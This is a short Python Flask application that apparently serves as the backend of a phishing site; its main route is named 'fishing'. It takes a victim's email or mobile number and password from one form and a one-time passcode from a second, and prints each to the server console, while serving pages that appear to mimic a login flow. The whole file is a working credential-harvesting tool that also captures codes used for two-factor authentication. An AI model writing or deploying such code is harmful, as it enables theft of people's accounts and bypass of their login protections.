from flask import Flask,request,render_template
app=Flask(__name__)

@app.route("/")
def fishing():
    return render_template('index_1.html')

@app.route('/submit', methods=['POST'])
def get_details():
    user_name=request.form['emailOrMobile']
    password=request.form['password']
    print(f"User_name= {user_name} and Password= {password}")
    return render_template('index_2.html')
@app.route('/abc',methods=['POST'])
def show():
    otp=request.form['otp']
    print(f"Otp is:{otp}")
    return render_template('index_3.html')
if __name__=="__main__":
    app.run(host="0.0.0.0",port=5000)
 